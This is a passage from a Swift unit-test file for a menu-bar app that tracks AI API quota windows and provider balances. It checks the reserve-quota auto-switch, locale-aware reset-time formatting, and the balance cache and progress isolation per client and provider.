        XCTAssertEqual(legacyPresentation.unit, "Quota")
        XCTAssertEqual(legacyPresentation.officialQuotaWindows, legacy.officialQuotaWindows)
    }

    func testOfficialQuotaWindowResolverUsesOneSafePolicyForAllWindowOrders() {
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "5h",
            durationSeconds: 5 * 3_600
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "7d",
            durationSeconds: 7 * 86_400
        )
        let legacy = OfficialQuotaWindow(
            kind: .other,
            remaining: 63,
            label: "Quota",
            daysText: "Quota",
            reset: "later",
            durationSeconds: nil
        )

        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([fiveHour, sevenDay], preference: .fiveHour),
            .selected(fiveHour)
        )
        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([sevenDay, fiveHour], preference: .sevenDay),
            .selected(sevenDay)
        )
        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([sevenDay], preference: .fiveHour),
            .selected(sevenDay)
        )
        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([fiveHour], preference: .sevenDay),
            .unavailable
        )
        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([legacy], preference: .fiveHour),
            .legacy(legacy)
        )
        XCTAssertEqual(
            OfficialQuotaWindowResolver.resolve([], preference: .sevenDay),
            .legacy(nil)
        )
    }

    func testMenuBarAutoSwitchUsesReserveAsWholePrimaryAndKeepsOriginalResetSource() {
        LunaReserveUserFacing.testOverride = true
        defer { LunaReserveUserFacing.testOverride = nil }
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "5h",
            durationSeconds: 18_000
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "7d",
            durationSeconds: 604_800
        )
        let reserve = LunaReserveQuota(
            status: .available,
            remaining: 61,
            reset: "2h"
        )
        let snapshot = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [sevenDay, fiveHour],
            lunaReserve: reserve
        )
        let exhaustedFiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 0,
            label: fiveHour.label,
            daysText: fiveHour.daysText,
            reset: fiveHour.reset,
            durationSeconds: fiveHour.durationSeconds
        )
        let exhaustedSnapshot = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [sevenDay, exhaustedFiveHour],
            lunaReserve: reserve
        )

        let normal = snapshot.menuBarSnapshot(preferredQuotaWindow: .fiveHour)
        XCTAssertEqual(normal.amount, fiveHour.remaining)
        XCTAssertEqual(normal.menuBarPrimary, "80%")
        XCTAssertFalse(normal.menuBarUsesLunaReserve)
        XCTAssertEqual(
            normal.menuBarSecondary(
                displayMode: .remaining,
                lunaReserveResetTimeMode: .lunaReserve
            ),
            fiveHour.reset
        )

        let normalWithAutoSwitchEnabled = snapshot.menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertEqual(normalWithAutoSwitchEnabled.menuBarPrimary, "80%")
        XCTAssertFalse(normalWithAutoSwitchEnabled.menuBarUsesLunaReserve)

        let reservePresentation = exhaustedSnapshot.menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertEqual(reservePresentation.amount, reserve.remaining)
        XCTAssertEqual(reservePresentation.unit, tr(.keyLunaReserveTitle))
        XCTAssertTrue(reservePresentation.menuBarUsesLunaReserve)
        XCTAssertEqual(reservePresentation.menuBarPrimary, "61% 🌙")
        XCTAssertEqual(reservePresentation.menuBarTitle, " 61% 🌙")
        XCTAssertEqual(
            reservePresentation.menuBarSecondary(
                displayMode: .remaining,
                lunaReserveResetTimeMode: .lunaReserve
            ),
            reserve.reset
        )
        XCTAssertEqual(
            reservePresentation.menuBarSecondary(
                displayMode: .remaining,
                lunaReserveResetTimeMode: .originalQuota
            ),
            fiveHour.reset
        )

        let weeklyOriginalReset = exhaustedSnapshot.menuBarSnapshot(
            preferredQuotaWindow: .sevenDay,
            automaticallyUseLunaReserve: true
        )
        XCTAssertEqual(weeklyOriginalReset.amount, reserve.remaining)
        XCTAssertEqual(weeklyOriginalReset.selectedOfficialQuotaWindowKind, .sevenDay)
        XCTAssertEqual(
            weeklyOriginalReset.menuBarSecondary(
                displayMode: .remaining,
                lunaReserveResetTimeMode: .originalQuota
            ),
            sevenDay.reset
        )
    }

    func testMenuBarAutoSwitchRequiresExhaustedOriginalQuotaAndUsableReserve() {
        LunaReserveUserFacing.testOverride = true
        defer { LunaReserveUserFacing.testOverride = nil }
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "5h",
            durationSeconds: 18_000
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "7d",
            durationSeconds: 604_800
        )
        func snapshot(
            with reserve: LunaReserveQuota?,
            windows: [OfficialQuotaWindow] = [fiveHour, sevenDay]
        ) -> Snapshot {
            let displayWindow = windows.first(where: { $0.kind == .sevenDay })
                ?? windows[0]
            return Snapshot.official(
                "OpenAI",
                displayWindow.remaining,
                displayWindow.label,
                displayWindow.reset,
                date,
                windows: windows,
                lunaReserve: reserve
            )
        }

        let exhaustedFiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 0,
            label: fiveHour.label,
            daysText: fiveHour.daysText,
            reset: fiveHour.reset,
            durationSeconds: fiveHour.durationSeconds
        )

        let unavailable = snapshot(
            with: LunaReserveQuota(status: .unavailable, remaining: nil, reset: nil),
            windows: [exhaustedFiveHour, sevenDay]
        ).menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertFalse(unavailable.menuBarUsesLunaReserve)
        XCTAssertEqual(unavailable.menuBarPrimary, "0%")

        let missingRemaining = snapshot(
            with: LunaReserveQuota(status: .available, remaining: nil, reset: "2h"),
            windows: [exhaustedFiveHour, sevenDay]
        ).menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertFalse(missingRemaining.menuBarUsesLunaReserve)
        XCTAssertEqual(missingRemaining.menuBarPrimary, "0%")

        let zeroRemaining = snapshot(
            with: LunaReserveQuota(status: .available, remaining: 0, reset: "2h"),
            windows: [exhaustedFiveHour, sevenDay]
        ).menuBarSnapshot(
            // The 5-hour exhaustion is the trigger even when the 7-day
            // window remains the selected primary window.
            preferredQuotaWindow: .sevenDay,
            automaticallyUseLunaReserve: true
        )
        XCTAssertTrue(zeroRemaining.menuBarUsesLunaReserve)
        XCTAssertEqual(zeroRemaining.menuBarPrimary, "0% 🌙")

        let exhaustedSevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 0,
            label: sevenDay.label,
            daysText: sevenDay.daysText,
            reset: sevenDay.reset,
            durationSeconds: sevenDay.durationSeconds
        )
        let sevenDayOnly = Snapshot.official(
            "OpenAI",
            exhaustedSevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [exhaustedSevenDay],
            lunaReserve: LunaReserveQuota(status: .available, remaining: 61, reset: "2h")
        ).menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertTrue(sevenDayOnly.menuBarUsesLunaReserve)
        XCTAssertEqual(sevenDayOnly.menuBarPrimary, "61% 🌙")
        XCTAssertEqual(sevenDayOnly.selectedOfficialQuotaWindowKind, .sevenDay)
    }

    func testShippingUserFacingGateHidesMenuReserveAndIgnoresStoredPreferences() {
        XCTAssertFalse(LunaReserveUserFacing.isEnabled)
        XCTAssertNil(LunaReserveUserFacing.testOverride)

        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 0,
            label: "5-hour",
            daysText: "5 hours",
            reset: "1h",
            durationSeconds: 18_000
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 60,
            label: "7-day",
            daysText: "7 days",
            reset: "6d",
            durationSeconds: 604_800
        )
        let reserve = LunaReserveQuota(status: .available, remaining: 45, reset: "1h30m")
        let snapshot = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [fiveHour, sevenDay],
            lunaReserve: reserve
        )

        XCTAssertEqual(snapshot.lunaReserve, reserve)

        let always = snapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(always.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertNil(always.lunaReserve)
        XCTAssertNil(always.lunaReserveInsertionIndex)

        let autoSwitched = snapshot.menuBarSnapshot(
            preferredQuotaWindow: .fiveHour,
            automaticallyUseLunaReserve: true
        )
        XCTAssertEqual(autoSwitched.menuBarPrimary, "0%")
        XCTAssertFalse(autoSwitched.menuBarUsesLunaReserve)
        XCTAssertFalse(autoSwitched.menuBarPrimary.contains("🌙"))
        XCTAssertFalse(autoSwitched.menuBarToolTip.contains(tr(.keyLunaReserveTitle)))
    }

    func testOfficialQuotaResetFormattingUsesEachWindowTimestampAndLocalizedDayBoundary() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let sameDayReset = Date(timeIntervalSince1970: 1_700_003_600)
        let nextDayReset = Date(timeIntervalSince1970: 1_700_010_800)
        let timeZone = try XCTUnwrap(TimeZone(secondsFromGMT: 0))
        let calendar = Calendar(identifier: .gregorian)
        let locale = Locale(identifier: "en_GB")

        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-Hour Quota",
            daysText: "5 Hours",
            reset: "4h31m",
            durationSeconds: 18_000,
            resetAt: sameDayReset
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-Day Quota",
            daysText: "7 Days",
            reset: "5d18h",
            durationSeconds: 604_800,
            resetAt: nextDayReset
        )

        let fiveHourDate = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: sameDayReset,
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        let sevenDayDate = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: nextDayReset,
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        XCTAssertEqual(
            fiveHourDate,
            expectedResetDateText(
                sameDayReset,
                template: "jm",
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        XCTAssertEqual(
            sevenDayDate,
            expectedResetDateText(
                nextDayReset,
                template: "Mdjm",
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        XCTAssertNotEqual(fiveHourDate, sevenDayDate)

        // The day boundary is evaluated after converting both instants into
        // the user's local time zone, not in UTC.
        let westCoastTimeZone = try XCTUnwrap(TimeZone(secondsFromGMT: -8 * 3_600))
        let westCoastDate = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: nextDayReset,
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: westCoastTimeZone
            )
        )
        XCTAssertEqual(
            westCoastDate,
            expectedResetDateText(
                nextDayReset,
                template: "jm",
                calendar: calendar,
                locale: locale,
                timeZone: westCoastTimeZone
            )
        )

        let simplifiedChinese = Locale(identifier: "zh_Hans_CN")
        let simplifiedChineseDate = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: nextDayReset,
                relativeTo: now,
                calendar: calendar,
                locale: simplifiedChinese,
                timeZone: timeZone
            )
        )
        XCTAssertEqual(
            simplifiedChineseDate,
            expectedResetDateText(
                nextDayReset,
                template: "Mdjm",
                calendar: calendar,
                locale: simplifiedChinese,
                timeZone: timeZone
            )
        )
        let simplifiedChineseSameDay = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: sameDayReset,
                relativeTo: now,
                calendar: calendar,
                locale: simplifiedChinese,
                timeZone: timeZone
            )
        )
        XCTAssertNotEqual(simplifiedChineseDate, simplifiedChineseSameDay)

        XCTAssertEqual(
            fiveHour.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            tr(.keySnapshotValueValue, arguments: ["4h31m", fiveHourDate])
        )
        XCTAssertEqual(
            sevenDay.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            tr(.keySnapshotValueValue, arguments: ["5d18h", sevenDayDate])
        )

        let snapshot = Snapshot.official(
            "OpenAI",
            45,
            "7-Day Quota",
            "5d18h",
            now,
            windows: [fiveHour, sevenDay]
        )
        XCTAssertEqual(
            snapshot.officialResetDisplayValue(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            tr(.keySnapshotValueValue, arguments: ["5d18h", sevenDayDate])
        )
        XCTAssertEqual(
            snapshot.overviewReset(refreshDate: nil, formatter: DateFormatter()),
            tr(.keySnapshotResetValue, arguments: ["5d18h"])
        )
    }

    func testOfficialQuotaResetFormattingFallsBackWithoutInventingAValue() {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let timeZone = TimeZone(secondsFromGMT: 0)!
        let calendar = Calendar(identifier: .gregorian)
        let locale = Locale(identifier: "en_GB")

        let expired = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-Hour Quota",
            daysText: "5 Hours",
            reset: "4h31m",
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(-1)
        )
        let missing = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-Day Quota",
            daysText: "7 Days",
            reset: "5d18h",
            durationSeconds: 604_800
        )
        let noRelativeText = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-Hour Quota",
            daysText: "5 Hours",
            reset: nil,
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(3_600)
        )

        XCTAssertEqual(
            expired.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            "4h31m"
        )
        XCTAssertEqual(
            missing.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            "5d18h"
        )
        XCTAssertNil(
            noRelativeText.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        XCTAssertNil(
            OfficialQuotaResetFormatter.string(
                for: now.addingTimeInterval(-1),
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )

        let other = OfficialQuotaWindow(
            kind: .other,
            remaining: 20,
            label: "Legacy",
            daysText: "Legacy",
            reset: "later",
            durationSeconds: nil,
            resetAt: now.addingTimeInterval(3_600)
        )
        XCTAssertEqual(
            other.resetDisplayText(
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            "later"
        )
    }

    func testCompactQuotaResetDisplayModesUseSelectedWindowAndSafeFallbacks() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let timeZone = try XCTUnwrap(TimeZone(secondsFromGMT: 0))
        let calendar = Calendar(identifier: .gregorian)
        let locale = Locale(identifier: "en_GB")
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "5h",
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(3_600)
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "7d",
            durationSeconds: 604_800,
            resetAt: now.addingTimeInterval(7_200)
        )
        let snapshot = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            now,
            windows: [sevenDay, fiveHour]
        )
        let fiveHourSnapshot = snapshot.menuBarSnapshot(preferredQuotaWindow: .fiveHour)
        let sevenDaySnapshot = snapshot.menuBarSnapshot(preferredQuotaWindow: .sevenDay)
        let fiveHourTarget = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: fiveHour.resetAt,
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )
        let sevenDayTarget = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: sevenDay.resetAt,
                relativeTo: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            )
        )

        XCTAssertEqual(
            fiveHourSnapshot.menuBarSecondary(
                displayMode: .remaining,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            fiveHour.reset
        )
        XCTAssertEqual(
            fiveHourSnapshot.menuBarSecondary(
                displayMode: .resetAt,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            fiveHourTarget
        )
        XCTAssertEqual(
            fiveHourSnapshot.menuBarSecondary(
                displayMode: .both,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            tr(.keySnapshotValueValue, arguments: [fiveHour.reset!, fiveHourTarget])
        )
        XCTAssertEqual(
            sevenDaySnapshot.menuBarSecondary(
                displayMode: .resetAt,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            sevenDayTarget
        )
        XCTAssertEqual(
            sevenDaySnapshot.menuBarSecondary(
                displayMode: .both,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            tr(.keySnapshotValueValue, arguments: [sevenDay.reset!, sevenDayTarget])
        )

        let invalidTimestamp = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "5h",
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(-1)
        )
        XCTAssertEqual(
            invalidTimestamp.resetDisplayText(
                displayMode: .resetAt,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            invalidTimestamp.reset
        )
        XCTAssertEqual(
            invalidTimestamp.resetDisplayText(
                displayMode: .both,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            invalidTimestamp.reset
        )
        let missingTimestamp = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "7d",
            durationSeconds: 604_800
        )
        XCTAssertEqual(
            missingTimestamp.resetDisplayText(
                displayMode: .resetAt,
                now: now,
                calendar: calendar,
                locale: locale,
                timeZone: timeZone
            ),
            missingTimestamp.reset
        )
    }

    func testOfficialQuotaResetFormattingFollowsLocaleHourCycle() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let resetAt = Date(timeIntervalSince1970: 1_700_003_600)
        let timeZone = try XCTUnwrap(TimeZone(secondsFromGMT: 0))
        let calendar = Calendar(identifier: .gregorian)

        let twelveHourLocale = Locale(identifier: "en_US")
        let twentyFourHourLocale = Locale(identifier: "en_GB")
        let twelveHour = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: resetAt,
                relativeTo: now,
                calendar: calendar,
                locale: twelveHourLocale,
                timeZone: timeZone
            )
        )
        let twentyFourHour = try XCTUnwrap(
            OfficialQuotaResetFormatter.string(
                for: resetAt,
                relativeTo: now,
                calendar: calendar,
                locale: twentyFourHourLocale,
                timeZone: timeZone
            )
        )

        XCTAssertEqual(
            twelveHour,
            expectedResetDateText(
                resetAt,
                template: "jm",
                calendar: calendar,
                locale: twelveHourLocale,
                timeZone: timeZone
            )
        )
        XCTAssertEqual(
            twentyFourHour,
            expectedResetDateText(
                resetAt,
                template: "jm",
                calendar: calendar,
                locale: twentyFourHourLocale,
                timeZone: timeZone
            )
        )
        XCTAssertNotEqual(twelveHour, twentyFourHour)
        XCTAssertTrue(twelveHour.contains("AM") || twelveHour.contains("PM"))
        XCTAssertFalse(twentyFourHour.contains("AM") || twentyFourHour.contains("PM"))
    }

    func testBalanceSnapshotAndCacheKeepProviderClientIsolation() {
        let date = Date(timeIntervalSince1970: 1_700_000_001)
        let balance = Snapshot.balance(
            "Provider One",
            12,
            "USD",
            URL(string: "https://provider.example"),
            date,
            progressPercentage: 20
        )
        XCTAssertEqual(balance.menuBarPrimary, "$12.00")
        XCTAssertEqual(balance.overviewProvider, "Provider One")
        XCTAssertEqual(balance.overviewQuotaTitle, tr(.keySnapshotAvailableBalance))
        XCTAssertEqual(balance.overviewQuotaDetail, tr(.keySnapshotRemainingBalance))
        XCTAssertEqual(balance.overviewLargeAmount, "$12.00")
        XCTAssertEqual(balance.progressPercentage, 20)

        var cache = ProviderBalanceSnapshotCache()
        cache.store(balance, clientID: "codex", providerID: "provider-one")
        let sameProvider = cache.errorSnapshot(
            clientID: "codex",
            providerID: "provider-one",
            providerName: "Provider One",
            reason: "Request failed"
        )
        XCTAssertEqual(sameProvider.kind, .error)
        XCTAssertEqual(sameProvider.amount, 12)
        XCTAssertEqual(sameProvider.unit, "USD")
        XCTAssertEqual(sameProvider.date, date)
        XCTAssertTrue(sameProvider.hasCachedBalance)
        XCTAssertEqual(sameProvider.message, "Request failed")

        let otherProvider = cache.errorSnapshot(
            clientID: "codex",
            providerID: "provider-two",
            providerName: "Provider Two",
            reason: "No cached balance"
        )
        XCTAssertNil(otherProvider.amount)
        XCTAssertNil(otherProvider.date)
        XCTAssertFalse(otherProvider.hasCachedBalance)

        let otherClient = cache.errorSnapshot(
            clientID: "claude",
            providerID: "provider-one",
            providerName: "Provider One",
            reason: "Different client"
        )
        XCTAssertNil(otherClient.amount)
        XCTAssertNil(otherClient.date)

        cache.store(balance, clientID: "codex", providerID: "provider-one", configurationRevision: "rev-a")
        let otherRevision = cache.errorSnapshot(
            clientID: "codex",
            providerID: "provider-one",
            providerName: "Provider One",
            reason: "Changed key",
            configurationRevision: "rev-b"
        )
        XCTAssertNil(otherRevision.amount)
        XCTAssertFalse(otherRevision.hasCachedBalance)
        let sameRevision = cache.errorSnapshot(
            clientID: "codex",
            providerID: "provider-one",
            providerName: "Provider One",
            reason: "Retry",
            configurationRevision: "rev-a"
        )
        XCTAssertEqual(sameRevision.amount, 12)
        XCTAssertTrue(sameRevision.hasCachedBalance)
    }

    func testProviderBalanceProgressUsesDynamicRechargeBaseline() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let identity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-one",
            query: query
        )
        let store = ProviderBalanceProgressStore(defaults: defaults)

        XCTAssertEqual(try progress(store, amount: 5, unit: "USD", identity: identity), 100)
        XCTAssertEqual(try progress(store, amount: 3, unit: "USD", identity: identity), 60)
        XCTAssertEqual(try progress(store, amount: 1, unit: "USD", identity: identity), 20)
        XCTAssertEqual(try progress(store, amount: 5.20, unit: "USD", identity: identity), 100)
        XCTAssertEqual(
            try progress(store, amount: 1, unit: "USD", identity: identity),
            100 / 5.2,
            accuracy: 0.000001
        )
    }

    func testProviderBalanceProgressRoundsToCentsAndPersistsIsolation() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let identity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-one",
            query: query
        )
        let store = ProviderBalanceProgressStore(defaults: defaults)

        XCTAssertEqual(try progress(store, amount: 5, unit: "USD", identity: identity), 100)
        XCTAssertEqual(try progress(store, amount: 4, unit: "USD", identity: identity), 80)
        XCTAssertEqual(
            try progress(store, amount: 4.004, unit: "USD", identity: identity),
            80,
            accuracy: 0.000001
        )
        XCTAssertEqual(try progress(store, amount: 4.01, unit: "USD", identity: identity), 100)

        let restored = ProviderBalanceProgressStore(defaults: defaults)
        XCTAssertEqual(
            try progress(restored, amount: 1, unit: "USD", identity: identity),
            100 / 4.01,
            accuracy: 0.000001
        )

        let otherEndpoint = makeBalanceProgressQuery(url: "https://provider.example/other")
        let otherIdentity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-one",
            query: otherEndpoint
        )
        XCTAssertEqual(try progress(restored, amount: 1, unit: "USD", identity: otherIdentity), 100)

        let otherCredential = makeBalanceProgressQuery(apiKey: "different-token")
        let otherCredentialIdentity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-one",
            query: otherCredential
        )
        XCTAssertEqual(
            try progress(restored, amount: 2, unit: "USD", identity: otherCredentialIdentity),
            100
        )

        let storedData = try XCTUnwrap(defaults.data(forKey: ProviderBalanceProgressStore.storageKey))
        XCTAssertFalse(String(data: storedData, encoding: .utf8)?.contains("different-token") == true)
    }

    func testProviderBalanceProgressHandlesNonPositiveAndRejectsInvalidOrInconsistentValues() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let query = makeBalanceProgressQuery()
        let identity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-one",
            query: query
        )
        let store = ProviderBalanceProgressStore(defaults: defaults)

        XCTAssertEqual(try progress(store, amount: 10, unit: "USD", identity: identity), 100)
        XCTAssertThrowsError(try progress(store, amount: -1.02, unit: "USD", identity: identity))

        let invalidIdentity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "invalid-provider",
            query: query
        )
        XCTAssertEqual(try progress(store, amount: 10, unit: "USD", identity: invalidIdentity), 100)
        guard case .failure(.invalidAmount) = store.update(
            amount: .nan,
            unit: "USD",
            identity: invalidIdentity
        ) else {
            return XCTFail("non-finite balances must not update the baseline")
        }
        guard case .failure(.invalidUnit) = store.update(
            amount: 9,
            unit: "  ",
            identity: invalidIdentity
        ) else {
            return XCTFail("empty units must not update the baseline")
        }
        guard case .success = store.update(
            amount: 9,
            unit: "CNY",
            identity: invalidIdentity
        ) else {
            return XCTFail("different currencies need independent wallet records")
        }
        XCTAssertEqual(try progress(store, amount: 5, unit: "USD", identity: invalidIdentity), 50)

        let zeroIdentity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "zero-provider",
            query: query
        )
        XCTAssertEqual(try progress(store, amount: 0, unit: "USD", identity: zeroIdentity), 1)
        XCTAssertEqual(try progress(store, amount: 0.004, unit: "USD", identity: zeroIdentity), 1)
        XCTAssertEqual(try progress(store, amount: 0.01, unit: "USD", identity: zeroIdentity), 1)
        XCTAssertEqual(try progress(store, amount: 0.09, unit: "USD", identity: zeroIdentity), 1)
        XCTAssertEqual(try progress(store, amount: 0.10, unit: "USD", identity: zeroIdentity), 100)
        XCTAssertEqual(try progress(store, amount: 0, unit: "USD", identity: zeroIdentity), 1)
    }

    func testProviderBalanceProgressUsesThePersistedDisplayThreshold() throws {
        let (defaults, suiteName) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let preferences = AppPreferences(defaults: defaults)
        preferences.balanceDisplayThreshold = 1.00

        let query = makeBalanceProgressQuery()
        let identity = ProviderBalanceProgressIdentity(
            client: .codex,
            providerID: "provider-threshold",
            query: query
        )
        let store = ProviderBalanceProgressStore(defaults: defaults)

        XCTAssertEqual(try progress(store, amount: 0.50, unit: "USD", identity: identity), 1)
        XCTAssertEqual(try progress(store, amount: 0.75, unit: "USD", identity: identity), 1)

        preferences.balanceDisplayThreshold = 0.10
        XCTAssertEqual(
            try progress(store, amount: 0.75, unit: "USD", identity: identity),
            100,
            accuracy: 0.000001
        )

        let restored = ProviderBalanceProgressStore(defaults: defaults)
        XCTAssertEqual(
            try progress(restored, amount: 0.75, unit: "USD", identity: identity),
            100,
            accuracy: 0.000001
        )
    }

    func testBalanceQueryPreservesExistingConfigurationRules() {
        let settingsText = #"{"apiKey":"test-token","baseUrl":"https://tokenshop.example.test/"}"#
        let metaText = #"{"usage_script":{"enabled":true,"code":"fetch({ url: \"{{baseUrl}}/v1/usage\" })","autoQueryInterval":12,"timeout":9}}"#
        let query = BalanceQuery.make(
            settingsText: settingsText,
            metaText: metaText,
            websiteText: " https://tokenshop.example.test ",
            appType: "claude"
        )

        XCTAssertEqual(query?.url, "https://tokenshop.example.test/v1/usage")
        XCTAssertEqual(query?.websiteURL, URL(string: "https://tokenshop.example.test"))
        XCTAssertEqual(query?.apiKey, "test-token")
        XCTAssertEqual(query?.intervalMinutes, 12)
        XCTAssertEqual(query?.timeoutSeconds, 9)
        XCTAssertFalse(query?.isRightCode ?? true)
        XCTAssertEqual(query?.subscriptionPrefix, "/claude")
        XCTAssertNil(query?.nativeBalanceProvider)
        XCTAssertFalse(query?.isNewAPI ?? true)
        XCTAssertTrue(query?.additionalHeaders.isEmpty ?? false)
    }

    func testBalanceQueryFailureAndNativeProviderRemainPure() {
        var failure: BalanceQueryFailure?
        let invalid = BalanceQuery.make(
            settingsText: "{}",
            metaText: "{}",
            websiteText: nil,
            appType: "codex",
            onFailure: { failure = $0 }
        )
        XCTAssertNil(invalid)
        XCTAssertEqual(failure?.rawValue, BalanceQueryFailure.usageScriptMissing.rawValue)

        let native = BalanceQuery.make(
            settingsText: #"{"apiKey":"test-token","baseUrl":"https://api.deepseek.com"}"#,
            metaText: #"{"usage_script":{"enabled":true,"templateType":"balance"}}"#,
            websiteText: nil,
            appType: "codex"
        )
        XCTAssertEqual(native?.url, "https://api.deepseek.com/user/balance")
